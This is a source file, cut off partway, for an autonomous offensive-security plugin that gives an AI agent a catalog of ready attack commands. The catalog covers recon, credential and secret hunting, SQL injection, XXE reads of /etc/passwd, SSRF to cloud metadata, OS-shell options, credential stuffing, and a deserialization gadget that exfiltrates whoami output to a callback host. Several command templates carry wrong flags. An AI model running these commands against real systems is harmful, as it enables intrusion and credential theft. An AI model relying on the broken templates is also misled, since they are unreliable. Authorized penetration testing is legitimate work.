/**
 * Raptor — autonomous offensive-security plugin for OpenCode (V2).
 *
 * Exposes a namespace of deterministic tools that give the Raptor agent:
 *   - an engagement workspace + persistent state (self-awareness)
 *   - a tool-chain router (decides which tool/command to run for an intent)
 *   - a toolchain doctor (detects + installs missing offensive tooling)
 *   - finding capture, evidence/reporting, recon diffing and cross-run memory
 *
 * The agent keeps the judgment; this plugin supplies the deterministic spine.
 */

import { execFileSync, spawn, spawnSync } from "node:child_process"
import { existsSync, mkdirSync, readFileSync, readdirSync, writeFileSync, appendFileSync, statSync, unlinkSync } from "node:fs"
import { join, resolve } from "node:path"
import { homedir } from "node:os"

const BASE = join(homedir(), ".raptor")
const ENG_DIR = join(BASE, "engagements")
const MEMORY = join(BASE, "memory.md")
const AGENT_ID = "raptor"

type Json = any

/* ------------------------------------------------------------------ utils */

function nowISO() {
  return new Date().toISOString()
}

function slug(s: string) {
  return (s || "target")
    .toLowerCase()
    .replace(/[^a-z0-9]+/g, "-")
    .replace(/^-+|-+$/g, "")
    .slice(0, 60)
}

function which(bin: string): boolean {
  try {
    execFileSync("which", [bin], { stdio: ["ignore", "ignore", "ignore"] })
    return true
  } catch {
    return false
  }
}

function readJSON(p: string, fallback: Json = null) {
  try {
    return JSON.parse(readFileSync(p, "utf8"))
  } catch {
    return fallback
  }
}

function writeJSON(p: string, v: Json) {
  writeFileSync(p, JSON.stringify(v, null, 2))
}

function ensureDir(p: string) {
  mkdirSync(p, { recursive: true })
}

function latestEngagement(): string | null {
  try {
    const dirs = readdirSync(ENG_DIR)
      .filter((d) => existsSync(join(ENG_DIR, d, "state.json")))
      .sort()
    return dirs.length ? join(ENG_DIR, dirs[dirs.length - 1]) : null
  } catch {
    return null
  }
}

function activeEngagementDir(): string | null {
  const pointer = join(BASE, "active")
  if (existsSync(pointer)) {
    const d = readFileSync(pointer, "utf8").trim()
    if (d && existsSync(join(d, "state.json"))) return d
  }
  return latestEngagement()
}

function loadState(dir: string): Json {
  return readJSON(join(dir, "state.json"), {})
}

function saveState(dir: string, s: Json) {
  s.updated_at = nowISO()
  writeJSON(join(dir, "state.json"), s)
}

/* ------------------------------------------------------- toolchain catalog */

type ReleaseSpec = { repo: string; asset_regex?: string; extract?: string; dest?: string; install_cmd?: string }
type Install = {
  apt?: string
  pip?: string
  go?: string
  cargo?: string
  git?: string
  npm?: string
  gem?: string
  /** direct download URL */
  url?: string
  /** destination file or directory for the url / release_gh kind */
  dest?: string
  /** treat the downloaded file as an archive and unpack it into dest */
  extract?: boolean
  /** github release: resolve newest release, match asset_regex, place/extract */
  release_gh?: ReleaseSpec
  /** shipped implementation in ~/.raptor/tools/local (value = script filename or directory) */
  local?: string
  note?: string
}
type ToolSpec = { bin: string; cmd: string; install?: Install; alt?: string }
type Route = {
  phase: string
  goal: string
  tools: ToolSpec[]
  notes?: string[]
  stop?: string
}

/** T(bin, command-template, install, alternative) */
const T = (bin: string, cmd: string, install?: Install, alt?: string): ToolSpec => ({ bin, cmd, install, alt })

const GO_SUBFINDER: Install = { apt: "subfinder", go: "github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest" }
const GO_ASSETFINDER: Install = { go: "github.com/tomnomnom/assetfinder@latest" }
const GO_DNSX: Install = { go: "github.com/projectdiscovery/dnsx/cmd/dnsx@latest" }
const GO_FFUF: Install = { go: "github.com/ffuf/ffuf/v2@latest" }
const GO_NUCLEI: Install = { go: "github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest" }
const GO_HTTPX: Install = { go: "github.com/projectdiscovery/httpx/cmd/httpx@latest" }
const GO_KATANA: Install = { go: "github.com/projectdiscovery/katana/cmd/katana@latest" }
const GO_NAABU: Install = { go: "github.com/projectdiscovery/naabu/v2/cmd/naabu@latest" }
const GO_TLSX: Install = { go: "github.com/projectdiscovery/tlsx/cmd/tlsx@latest" }
const GO_GAU: Install = { go: "github.com/lc/gau/v2/cmd/gau@latest" }
const GO_WAYBACK: Install = { go: "github.com/tomnomnom/waybackurls@latest" }
const GO_DALFOX: Install = { go: "github.com/hahwul/dalfox/v2@latest" }
const GO_TRUFFLEHOG: Install = { go: "github.com/trufflesecurity/trufflehog@latest" }
const GO_GITLEAKS: Install = { go: "github.com/gitleaks/gitleaks@latest" }
const GO_NETEXEC: Install = { pip: "netexec" }
const GO_IMPACKET: Install = { pip: "impacket" }
const GO_PWNTOOLS: Install = { pip: "pwntools" }
const GO_YARA: Install = { apt: "yara" }
const GO_CAPA: Install = { pip: "flare-capa" }
const GO_FLOSS: Install = { pip: "flare-floss" }
const GO_BINWALK: Install = { pip: "binwalk" }
const GO_UNBLOB: Install = { pip: "unblob" }
const GO_GOBUSTER: Install = { apt: "gobuster" }
const GO_NMAP: Install = { apt: "nmap" }
const GO_FFUF_ALT: Install = { go: "github.com/ffuf/ffuf/v2@latest" }

const ROUTES: Record<string, Route> = {
  /* ---------------- recon: passive / DNS ---------------- */
  "subdomain-enum": {
    phase: "recon",
    goal: "Enumerate subdomains and resolve them for the target",
    tools: [
      T("subfinder", "subfinder -d {target} -all -silent -o {out}/subs.txt", GO_SUBFINDER, "assetfinder / findomain / crt.sh via curl"),
      T("amass", "amass enum -d {target} -o {out}/amass.txt", { apt: "amass" }, "amass enum -passive -d {target}"),
      T("assetfinder", "assetfinder --subs-only {target} > {out}/asset.txt", GO_ASSETFINDER, "curl -s 'https://crt.sh/?q=%25.{target}&output=json'"),
      T("findomain", "findomain -t {target} -o {out}/findomain.txt", { go: "github.com/Findomain/Findomain@latest" }, "subfinder"),
      T("shuffledns", "shuffledns -d {target} -list {out}/all_subs.txt -silent -o {out}/resolved.txt", { go: "github.com/projectdiscovery/shuffledns@latest" }, "dnsx"),
      T("dnsx", "dnsx -l {out}/all_subs.txt -a -silent -resp -o {out}/resolved.txt", GO_DNSX, "dig +short A {target}"),
      T("tlsx", "tlsx -l {out}/all_subs.txt -san -cn -silent -o {out}/tls.txt", GO_TLSX, "openssl s_client -connect {target}:443"),
    ],
    notes: [
      "Merge every source first, then resolve: cat subs.txt amass.txt asset.txt findomain.txt | sort -u > all_subs.txt",
      "tlsx SAN expansion usually uncovers hostnames that no subdomain tool found.",
      "Re-resolve with public resolvers to catch takeover-prone CNAMEs.",
    ],
    stop: "Stop when the resolved set stops growing across 2 consecutive sources.",
  },
  "dns-records": {
    phase: "recon",
    goal: "Pull MX/NS/TXT/CNAME/SOA records - misconfig and takeover surface",
    tools: [
      T("dnsx", "dnsx -d {target} -silent -a -aaaa -cname -ns -mx -txt -resp -o {out}/dns.txt", GO_DNSX, "dig +short MX {target}"),
      T("dig", "dig {target} ANY +noall +answer", { apt: "dnsutils" }, "nslookup -type=any {target}"),
      T("host", "host -t any {target}", { apt: "dnsutils" }),
    ],
    notes: ["SPF/DMARC/CNAME-to-SaaS records reveal takeover candidates and mail routing."],
  },
  "historical-urls": {
    phase: "recon",
    goal: "Pull historical URLs - forgotten endpoints, old admin panels",
    tools: [
      T("gau", "gau --threads 5 --o {out}/gau.txt {target}", GO_GAU, "waybackurls"),
      T("waybackurls", "cat {out}/seeds.txt | waybackurls > {out}/wayback.txt", GO_WAYBACK, "gau"),
      T("katana", "katana -u https://{target} -d 3 -jc -kf all -silent -o {out}/katana.txt", GO_KATANA, "gospider"),
      T("urlfinder", "urlfinder -d {target} -silent -o {out}/urlfinder.txt", { go: "github.com/projectdiscovery/urlfinder/cmd/urlfinder@latest" }, "gau"),
    ],
    notes: ["Then: httpx -l urls.txt -mc 200 -o live200.txt - dead endpoints are often unpatched."],
  },
  "port-scan": {
    phase: "recon",
    goal: "Enumerate open TCP ports",
    tools: [
      T("naabu", "naabu -host {target} -top-ports 1000 -rate 1000 -silent -o {out}/ports.txt", GO_NAABU, "nmap -Pn -p- --min-rate 1000 {target}"),
      T("masscan", "masscan -p1-65535 --rate 2000 {target} --open -oL {out}/masscan.txt", { apt: "masscan" }, "naabu"),
      T("rustscan", "rustscan -a {target} --ulimit 5000 -- -sC", { cargo: "rustscan" }, "nmap"),
      T("nmap", "nmap -Pn -sV -sC -T4 -p- {target} -oA {out}/nmap_{target}", GO_NMAP, "naabu then nmap -sV on the open ports"),
    ],
    notes: [
      "masscan needs raw sockets: setcap cap_net_raw,cap_net_admin+eip $(which masscan)",
      "Save nmap XML (-oX) into evidence/ - it is the version-to-CVE source of truth.",
      "Never scan outside the declared scope set.",
    ],
  },
  "service-fingerprint": {
    phase: "recon",
    goal: "Identify services, versions, banners",
    tools: [
      T("nmap", "nmap -sV --version-all -Pn -p {ports} {target} -oA {out}/sv_{target}", GO_NMAP, "httpx for http services"),
      T("httpx", "httpx -l {out}/hosts.txt -title -tech-detect -status-code -web-server -follow-redirects -o {out}/web.txt", GO_HTTPX, "curl -skI {url}"),
      T("whatweb", "whatweb -a 3 {url} --log-json={out}/whatweb.json", { apt: "whatweb" }),
    ],
    notes: ["Version banners drive CVE matching later. Save raw output as evidence."],
  },
  "web-fingerprint": {
    phase: "recon",
    goal: "HTTP fingerprint: tech stack, status, title, CDN/WAF",
    tools: [
      T("httpx", "httpx -l {out}/hosts.txt -title -tech-detect -status-code -web-server -cdn -asn -follow-redirects -json -o {out}/web.json", GO_HTTPX, "curl -skI {url}"),
      T("wafw00f", "wafw00f -a {url}", { apt: "wafw00f" }, "nuclei -tags waf"),
      T("whatweb", "whatweb -a 3 {url}", { apt: "whatweb" }),
      T("nikto", "nikto -h {url} -C all -timeout 10 -maxtime 300s -o {out}/nikto.txt", { apt: "nikto" }),
    ],
    notes: ["WAF detection decides whether to slow down, switch vectors, or use raw sockets."],
  },
  "honeypot-detect": {
    phase: "recon",
    goal: "Detect honeypots, sandboxes and tarpits before going loud",
    tools: [
      T("httpx", "httpx -l {out}/hosts.txt -title -hash sha256 -status-code -silent", GO_HTTPX, "curl -sk -o /dev/null -w '%{http_code} %{size_download}\\n' {url}"),
      T("nmap", "nmap -sV -Pn {target}", GO_NMAP, "python3 socket timing script"),
    ],
    notes: [
      "Tells: uniform low-latency replies, identical banner hashes, decoy file names, instant 200 on random paths.",
      "If detected: switch to the stealth profile, drop noisy tooling, never run destructive payloads.",
    ],
  },
  "cloud-asset-discovery": {
    phase: "recon",
    goal: "Find cloud buckets, orgs and SaaS assets for the target org",
    tools: [
      T("aws", "aws s3 ls s3://{bucket} --no-sign-request", { pip: "awscli" }, "curl -s https://{bucket}.s3.amazonaws.com/"),
      T("s3scanner", "s3scanner scan -bucket-file {out}/buckets.txt -enumerate", { go: "github.com/sa7mon/s3scanner@latest" }, "aws s3 ls"),
      T("cloud_enum", "cloud_enum -k {keyword} -l {out}/bucket_list.txt", { go: "github.com/initstring/cloud_enum@latest" }, "curl bucket names directly"),
      T("gcloud", "gcloud storage ls -a gs://{bucket}", {}, "aws s3 ls"),
      T("az", "az storage account list -o table", {}, "aws s3 ls"),
    ],
    notes: [
      "Search for org-name-derived bucket names; check existence + list permission.",
      "Proof = one known key file fetched, not a full bucket listing.",
    ],
  },
  "takeover-check": {
    phase: "recon",
    goal: "Detect subdomain takeover candidates",
    tools: [
      T("subjack", "subjack -w {out}/all_subs.txt -ssl -v -o {out}/takeover.txt", { go: "github.com/haccer/subjack@latest" }, "nuclei -tags takeover"),
      T("nuclei", "nuclei -tags takeover -l {out}/resolved.txt -silent -o {out}/takeover_nuclei.txt", GO_NUCLEI, "manual CNAME check"),
      T("amass", "amass enum -d {target} -passive -o {out}/passive.txt", { apt: "amass" }),
    ],
  },
  "asn-surface": {
    phase: "recon",
    goal: "Enumerate ASN/IP ranges owned by the target org",
    tools: [
      T("amass", "amass intel -org '{org}' -d {out}/asn.txt", { apt: "amass" }, "whois"),
      T("whois", "whois {target} > {out}/whois.txt", { apt: "whois" }),
      T("bgpview", "bgpview asn {asn} > {out}/bgp.txt", { pip: "bgpview" }, "amass intel"),
    ],
  },

  /* ---------------- attack surface ---------------- */
  "dir-enum": {
    phase: "surface",
    goal: "Enumerate directories and files",
    tools: [
      T("ffuf", "ffuf -u {url}/FUZZ -w {out}/words.txt -mc all -fc 404 -t 40 -o {out}/ffuf.json -of json", GO_FFUF, "gobuster dir"),
      T("gobuster", "gobuster dir -u {url} -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,txt,bak -t 40 -o {out}/gobuster.txt", GO_GOBUSTER, "ffuf"),
      T("feroxbuster", "feroxbuster -u {url} -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --depth 3 -o {out}/ferox.txt", { cargo: "feroxbuster" }, "ffuf"),
      T("dirsearch", "dirsearch -u {url} -w /usr/share/seclists/Discovery/Web-Content/common.txt -e php,html,txt,bak,zip -o {out}/dirsearch.txt", { pip: "dirsearch" }, "ffuf"),
    ],
    notes: [
      "Wordlist: /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt or common.txt.",
      "Always -mc all -fc 404 to kill soft-404 noise; if everything returns 200 filter by response length (-fs).",
    ],
  },
  "file-ext-enum": {
    phase: "surface",
    goal: "Find files by extension - backup, config, source leak",
    tools: [
      T("ffuf", "ffuf -u {url}/FUZZ.{ext} -w {out}/words.txt -mc all -fc 404 -t 40 -o {out}/ext.json -of json", GO_FFUF, "gobuster -x"),
      T("gobuster", "gobuster dir -u {url} -w common.txt -x bak,old,orig,swp,sql,zip,tar.gz,env,git,yml,conf,log,inc,php~,ashx,jsp,war -t 40", GO_GOBUSTER, "ffuf"),
      T("feroxbuster", "feroxbuster -u {url} -w raft-medium-directories.txt --collect-words --extract-links -o {out}/ferox.txt", { cargo: "feroxbuster" }, "ffuf"),
    ],
    notes: ["High-value extensions: .bak .old .orig .swp .sql .zip .tar.gz .env .git .yml .conf .log .pem .key .p12 .pfx .map .php~ .inc .ashx .jsp .war"],
  },
  "param-fuzz": {
    phase: "surface",
    goal: "Discover hidden GET/POST parameters",
    tools: [
      T("arjun", "arjun -u {url} -m GET,POST -oJ -o {out}/arjun.json", { pip: "arjun" }, "ffuf"),
      T("ffuf", "ffuf -u {url}?FUZZ=1 -w {out}/params.txt -mc all -fc 404 -t 40 -o {out}/params.json -of json", GO_FFUF, "arjun"),
      T("x8", "x8 -u {url} -w {out}/params.txt", { go: "github.com/Sh1Yo/x8@latest" }, "arjun"),
    ],
  },
  "js-analysis": {
    phase: "surface",
    goal: "Mine JS for endpoints, keys and source maps",
    tools: [
      T("trufflehog", "trufflehog filesystem {out}/js/ --no-update", GO_TRUFFLEHOG, "gitleaks"),
      T("gitleaks", "gitleaks detect -s {out}/js --no-git -v -r {out}/gitleaks.txt", GO_GITLEAKS, "trufflehog"),
      T("semgrep", "semgrep --config=p/secrets --config=p/javascript --config=secrets --json -o {out}/semgrep.json {out}/js", { pip: "semgrep" }, "grep"),
      T("LinkFinder", "python3 LinkFinder.py -i {out}/js/app.js -o cli -o {out}/links.txt", { git: "https://github.com/GerbenJavado/LinkFinder" }, "katana -jc"),
      T("SecretFinder", "python3 SecretFinder.py -i {out}/js/app.js -o {out}/secrets.txt", { git: "https://github.com/m4l4n/SecretFinder" }, "trufflehog"),
    ],
    notes: [
      "Download the bundle first: curl -sk {url}/static/js/*.js -o {out}/js/",
      "Then regex for Authorization/api_key/token/secret/JWT in the extracted strings.",
    ],
  },
  "secret-hunt": {
    phase: "surface",
    goal: "Hunt credentials and secrets in files, git history and responses",
    tools: [
      T("trufflehog", "trufflehog filesystem {path} --no-update", GO_TRUFFLEHOG, "gitleaks"),
      T("gitleaks", "gitleaks detect -s {path} --no-git -v -r {out}/gitleaks.txt", GO_GITLEAKS, "trufflehog"),
      T("git", "git -C {path} log -p --all | gitleaks detect - --source .", {}, "grep -r"),
      T("grep", "grep -rInE '(AKIA[0-9A-Z]{16}|AIza[0-9A-Za-z_-]{35}|ghp_[A-Za-z0-9]{36}|xox[baprs]-|-----BEGIN [A-Z ]*PRIVATE KEY)' {path}", { apt: "grep" }),
    ],
  },
  "git-exposure": {
    phase: "surface",
    goal: "Recover exposed .git repositories and their history",
    tools: [
      T("curl", "curl -sk {url}/.git/HEAD && git clone --mirror {url}/.git {out}/repo.git", { apt: "curl" }, "wget"),
      T("gitleaks", "gitleaks detect -s {out}/repo.git --log-opts='--all' -v -r {out}/git_secrets.txt", GO_GITLEAKS, "trufflehog git"),
    ],
    notes: ["After cloning: git -C repo.git log --all -p -- . | grep -iE 'password|secret|key'"],
  },
  "api-map": {
    phase: "surface",
    goal: "Extract API routes, schemas and auth requirements",
    tools: [
      T("katana", "katana -u https://{target} -d 3 -jc -kf all -silent -o {out}/api_routes.txt", GO_KATANA, "gau"),
      T("nuclei", "nuclei -tags exposure,misconfig,api -l {out}/hosts.txt -silent -o {out}/api_findings.txt", GO_NUCLEI, "curl openapi.json"),
      T("swagger", "swagger-parser validate {out}/openapi.json && jq -r '.paths | keys[]' {out}/openapi.json", { npm: "@apidevtools/swagger-parser" }, "curl + jq"),
      T("kiterunner", "kiterunner scan {url} -w {out}/routes.txt -x 20 -o text", { go: "github.com/assetnote/kiterunner@latest" }, "ffuf"),
    ],
    notes: [
      "Look for /swagger.json /openapi.json /api-docs /graphql /actuator /v2/api-docs.",
      "Build an endpoint->method->auth->params->IDOR-candidate table before attacking.",
    ],
  },
  "graphql-enum": {
    phase: "surface",
    goal: "Enumerate GraphQL schema, fields and mutations",
    tools: [
      T("graphql-cop", "graphql-cop -u {url} -o {out}/gql_schema.json", { pip: "graphql-cop" }, "curl introspection query"),
      T("inql", "inql -t {url} -o {out}/inql.txt", { pip: "inql" }, "graphql-cop"),
      T("curl", "curl -s {url} -H 'content-type: application/json' -d '{\"query\":\"{__schema{types{name,fields{name,args{name,type{name}}}}}}}\"}' -o {out}/gql.json", { apt: "curl" }),
    ],
  },
  "vuln-scan": {
    phase: "surface",
    goal: "Template-driven vulnerability sweep to shortlist candidates",
    tools: [
      T("nuclei", "nuclei -l {out}/hosts.txt -severity low,medium,high,critical -rl 150 -json -o {out}/nuclei.json", GO_NUCLEI, "nikto"),
      T("nikto", "nikto -h {url} -C all -timeout 10 -maxtime 600s -o {out}/nikto.txt", { apt: "nikto" }, "nuclei"),
      T("wapiti", "wapiti -u {url} -m all -f {out}/wapiti.json --scope folder", { pip: "wapiti3" }, "zap"),
      T("zap", "zap-baseline.py -t {url} -r {out}/zap.html -J {out}/zap.json", { apt: "zaproxy" }, "nuclei"),
    ],
    notes: ["nuclei JSON output is your candidate list - never a finding on its own."],
    stop: "Stop when the candidate list stops producing new classes.",
  },
  "cve-match": {
    phase: "surface",
    goal: "Map detected versions to known CVEs and public exploits",
    tools: [
      T("searchsploit", "searchsploit {product} {version}", { apt: "exploitdb" }, "websearch {product} {version} CVE"),
      T("nuclei", "nuclei -t cves/ -severity critical,high -l {out}/hosts.txt -json -o {out}/cves.json", GO_NUCLEI, "searchsploit"),
      T("grype", "grype dir:{path} -o json > {out}/grype.json", { go: "github.com/anchore/grype@latest" }, "osv-scanner"),
      T("osv-scanner", "osv-scanner --recursive {path} --format json > {out}/osv.json", { go: "github.com/google/osv-scanner/cmd/osv-scanner@latest" }, "searchsploit"),
    ],
    notes: ["Verify the CVE applies to the EXACT running version - distro backports break this."],
  },

  /* ---------------- web exploitation ---------------- */
  "sqli": {
    phase: "exploit",
    goal: "SQL injection discovery and confirmation",
    tools: [
      T("sqlmap", "sqlmap -u '{url}' -p {param} --batch --risk=1 --level=1 --technique=BEUSTQ --dbs --threads=4 -o {out}/sqlmap.txt", { apt: "sqlmap" }, "ghauri"),
      T("ghauri", "ghauri -u '{url}' -m {param} --dbs", { pip: "ghauri" }, "sqlmap"),
      T("sqlninja", "sqlninja -u {url} -r {out}/req.txt -d {out}/sqlninja.db", { apt: "sqlninja" }, "sqlmap"),
    ],
    notes: [
      "Confirm manually first (single quote -> error/boolean delta) before running sqlmap.",
      "--os-shell and --file-write touch the server filesystem - only with an explicit operator go.",
      "Blind/time-based needs --time-sec=6; impatient timeouts create false negatives.",
    ],
  },
  "nosqli": {
    phase: "exploit",
    goal: "NoSQL injection (Mongo) discovery",
    tools: [
      T("nosqlmap", "nosqlmap -u '{url}' --method POST --data '{json}' -m 6", { pip: "nosqlmap" }, "curl with $ne/$gt/$regex payloads"),
      T("curl", "curl -sk '{url}' -H 'content-type: application/json' -d '{\"user\":{\"$ne\":\"\"},\"password\":{\"$ne\":\"\"}}' -i", { apt: "curl" }),
    ],
    notes: ["Payload family: $ne, $gt, $regex, $where on JSON bodies."],
  },
  "xss": {
    phase: "exploit",
    goal: "Reflected, stored and DOM XSS discovery and verification",
    tools: [
      T("dalfox", "dalfox url '{url}' --silence --skip-bav --format json", GO_DALFOX, "xsser"),
      T("xsser", "xsser -u '{url}' --crawl -r", { git: "https://github.com/xsscout/xsser" }, "dalfox"),
      T("nuclei", "nuclei -t xss/ -l {out}/hosts.txt -silent -o {out}/xss.txt", GO_NUCLEI, "manual payloads"),
    ],
    notes: ["Verify the sink context (HTML body / attribute / JS) - severity depends on it.", "DOM XSS needs JS source analysis; no server-side scanner finds it."],
  },
  "ssti": {
    phase: "exploit",
    goal: "Server-side template injection",
    tools: [
      T("tplmap", "tplmap -u '{url}' -d '{param}' --level 5 --os-shell", { git: "https://github.com/volks73t/tplmap" }, "sstimap"),
      T("sstimap", "sstimap -u '{url}' -d '{param}'", { pip: "sstimap" }, "curl with {{7*7}} / ${7*7} / <%= 7*7 %>"),
    ],
    notes: ["Probe per engine family: Jinja2/Twig {{7*7}}, Freemarker ${7*7}, ERB <%= 7*7 %>, JSP ${7*7}, Blade @php."],
  },
  "xxe": {
    phase: "exploit",
    goal: "XML external entity injection",
    tools: [
      T("xxenum", "xxenum -u '{url}' -c \"<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>\"", { pip: "xxenum" }, "xxe"),
      T("curl", "curl -sk '{url}' -H 'Content-Type: application/xml' --data-binary @payload.xml -i", { apt: "curl" }),
    ],
  },
  "ssrf": {
    phase: "exploit",
    goal: "Server-side request forgery to internal services and cloud metadata",
    tools: [
      T("ssrfmap", "ssrfmap -u '{url}' -p {param} -m readfiles", { pip: "ssrfmap" }, "gopherus"),
      T("gopherus", "gopherus --exploit redis {host}:6379", { go: "github.com/hatw/gopherus@latest" }, "manual gopher payload"),
      T("curl", "curl -sk '{url}?{param}=http://169.254.169.254/latest/meta-data/' -i", { apt: "curl" }),
    ],
    notes: [
      "Test 169.254.169.254, metadata.google.internal, RFC1918, 127.0.0.1, decimal/hex IP encodings, ::ffff:127.0.0.1.",
      "SSRF -> metadata -> IAM role -> STS AssumeRole is the money chain; prove each hop.",
    ],
  },
  "command-injection": {
    phase: "exploit",
    goal: "OS command injection",
    tools: [
      T("commix", "commix -u '{url}' -p {param} --batch --skip-technique=file --skip-technique=os", { pip: "commix" }, "curl with ;id |id $(id)"),
      T("nuclei", "nuclei -t cmd-injection/ -l {out}/hosts.txt -silent -o {out}/cmdi.txt", GO_NUCLEI, "manual"),
    ],
    notes: ["Confirm with a benign marker (id, echo RAPTOR) before any payload that writes."],
  },
  "path-traversal": {
    phase: "exploit",
    goal: "LFI/RFI and arbitrary file read",
    tools: [
      T("lfimap", "lfimap -u '{url}' -p {param} -a etc/passwd", { pip: "lfimap" }, "ffuf"),
      T("ffuf", "ffuf -u '{url}?{param}=FUZZ' -w {out}/lfi.txt -mc all -fc 400,500 -o {out}/lfi.json -of json", GO_FFUF, "curl"),
    ],
    notes: ["Try /etc/passwd, ....//, %2e%2e%2f, php://filter/convert.base64-encode/resource=index.php."],
  },
  "file-upload": {
    phase: "exploit",
    goal: "Unrestricted upload, extension bypass and upload-to-RCE",
    tools: [
      T("ffuf", "ffuf -u '{url}/upload/FUZZ' -w {out}/exts.txt -mc all -fc 404 -o {out}/upload.json -of json", GO_FFUF, "nuclei upload templates"),
      T("exiftool", "exiftool -all= {out}/shell.php.jpg && exiftool {out}/shell.php.jpg", { apt: "libimage-exiftool-perl" }, "file"),
      T("nuclei", "nuclei -t file-upload/ -l {out}/hosts.txt -silent -o {out}/upload.txt", GO_NUCLEI, "manual"),
    ],
    notes: ["Extensions: .phtml .php5 .pht .phar .shtml .asp .aspx .cer .jsp .jspx .war .svg .html .htaccess", "Check content-type validation vs extension vs magic bytes separately."],
  },
  "deserialization": {
    phase: "exploit",
    goal: "Insecure deserialization (Java/.NET/PHP/Python)",
    tools: [
      T("ysoserial", "java -jar ysoserial-all.jar CommonsCollections6 'curl http://{lab}/$(whoami)' > {out}/payload.bin", { git: "https://github.com/frohoff/ysoserial" }, "marshalsec"),
      T("marshalsec", "java -jar marshalsec.jar -a -M com.sun.rowset.JdbcRowSetImpl", { git: "https://github.com/marshalsec/marshalsec" }, "ysoserial"),
      T("fenix", "python3 fenix.py -u '{url}' -p {param} -c {method}", { git: "https://github.com/0x727/Fenix" }, "ysoserial"),
    ],
    notes: ["Use a DNS/HTTP callback gadget first to prove reachability; escalate only on explicit go."],
  },
  "prototype-pollution": {
    phase: "exploit",
    goal: "Prototype pollution and mass assignment",
    tools: [
      T("curl", "curl -sk '{url}' -H 'content-type: application/json' -d '{\"__proto__\":{\"role\":\"admin\"}}' -i", { apt: "curl" }),
      T("nuclei", "nuclei -t prototype-pollution/ -l {out}/hosts.txt -silent", GO_NUCLEI, "manual mass-assignment diffing"),
    ],
  },
  "host-header": {
    phase: "exploit",
    goal: "Host header injection, cache poisoning, password-reset poisoning",
    tools: [
      T("curl", "curl -sk '{url}' -H 'Host: evil.tld' -H 'X-Forwarded-Host: evil.tld' -i", { apt: "curl" }),
      T("ffuf", "ffuf -u '{url}' -H 'Host: FUZZ.tld' -w {out}/hosts.txt -o {out}/host.txt", GO_FFUF, "nuclei"),
    ],
  },
  "cors-misconfig": {
    phase: "exploit",
    goal: "CORS misconfiguration with credential reflection",
    tools: [
      T("corscanner", "corscanner -i {url} -q", { go: "github.com/OutOfLine/CorsScan@latest" }, "curl -H 'Origin: https://evil.tld' -i"),
      T("curl", "curl -sk '{url}' -H 'Origin: https://evil.tld' -i -D -", { apt: "curl" }),
    ],
  },
  "open-redirect": {
    phase: "exploit",
    goal: "Open redirect for OAuth token theft and phishing pivots",
    tools: [
      T("oralyzer", "oralyzer -l {out}/urls.txt", { pip: "oralyzer" }, "curl -sIL '{url}?redirect=https://evil.tld'"),
      T("curl", "curl -skI '{url}?redirect=https://evil.tld' | grep -i '^location'", { apt: "curl" }),
    ],
  },

  /* ---------------- auth / session ---------------- */
  "jwt-audit": {
    phase: "exploit",
    goal: "JWT weaknesses: alg=none, key confusion, weak secret, missing claims",
    tools: [
      T("jwt_tool", "python3 jwt_tool.py '{token}' -T -X k -p {out}/keys.txt", { git: "https://github.com/ticarpi/jwt_tool" }, "manual decode"),
      T("hashcat", "hashcat -m 16500 {out}/jwt.txt {out}/words.txt", { apt: "hashcat" }, "john --format=HMAC-SHA256"),
      T("john", "john --format=HMAC-SHA256 {out}/jwt.txt --wordlist={out}/words.txt", { apt: "john" }, "hashcat -m 16500"),
    ],
    notes: ["hashcat -m 16500 cracks HS256; check kid header injection and jku/x5u SSRF."],
  },
  "session-analysis": {
    phase: "exploit",
    goal: "Cookie and session fixation, predictability, missing rotation",
    tools: [
      T("curl", "curl -skc {out}/jar.txt -b {out}/jar.txt '{url}' -i", { apt: "curl" }),
      T("bettercap", "bettercap -eval 'net.recon on' -eval 'net.probe on' -eval 'http.proxy on'", { go: "github.com/bettercap/bettercap@latest" }, "mitmproxy"),
    ],
  },
  "auth-bypass": {
    phase: "exploit",
    goal: "Authentication bypass through logic and implementation gaps",
    tools: [
      T("nuclei", "nuclei -t auth/ -t default-logins/ -l {out}/hosts.txt -silent -o {out}/auth.txt", GO_NUCLEI, "manual verb/path tampering"),
      T("ffuf", "ffuf -u '{url}/FUZZ' -w {out}/authpaths.txt -mc all -fc 404 -o {out}/authpaths.json -of json", GO_FFUF, "curl"),
    ],
    notes: ["Try verb tampering (X-HTTP-Method-Override), path tricks (/admin vs /admin/ vs /ADMIN vs %2f), JSON vs form confusion, role-field tampering, parameter pollution."],
  },
  "password-policy": {
    phase: "exploit",
    goal: "Weak password policy, missing lockout, user enumeration",
    tools: [
      T("curl", "curl -sk '{url}/login' -d 'user={user}&pass={wrong}' -i -o {out}/login_resp.txt", { apt: "curl" }),
      T("nuclei", "nuclei -t default-logins/ -l {out}/hosts.txt -silent", GO_NUCLEI, "manual enumeration test"),
    ],
  },
  "credential-stuffing": {
    phase: "exploit",
    goal: "Credential reuse testing against the target's own auth surface",
    tools: [
      T("hydra", "hydra -L {out}/users.txt -p {out}/words.txt {host} -s {port} -t {target} http-post-form '/login:user=^USER^&pass=^PASS^:F=Invalid' -o {out}/hydra.txt", { apt: "hydra" }, "netexec"),
      T("medusa", "medusa -h {host} -U {out}/users.txt -P {out}/words.txt -e s -t 4 -M web -T 600", { apt: "medusa" }, "hydra"),
      T("patator", "patator http_fuzz url='{url}' method=POST body='user=FILE0&pass=FILE1' 0={out}/users.txt 1={out}/words.txt -x ignore:fgrep='Invalid'", { apt: "patator" }, "hydra"),
      T("netexec", "netexec {domain} -u {out}/users.txt -p {out}/words.txt --continue-on-success", GO_NETEXEC, "hydra"),
    ],
    notes: ["Only the operator-supplied target auth endpoint. Keep rate low to avoid lockout noise and report the limit as a finding."],
  },
  "mfa-bypass": {
    phase: "exploit",
    goal: "MFA logic weaknesses: state machine, backup codes, OTP reuse",
    tools: [
      T("curl", "curl -sk '{url}/mfa/verify' -H 'content-type: application/json' -d '{\"code\":\"000000\"}' -i", { apt: "curl" }),
      T("burp", "burp --project-file={out}/mfa.burp --unpause", { apt: "burpsuite" }, "manual state-machine replay"),
    ],
  },

  /* ---------------- infrastructure / post-ex ---------------- */
  "linux-privesc": {
    phase: "post",
    goal: "Local privilege escalation on a foothold",
    tools: [
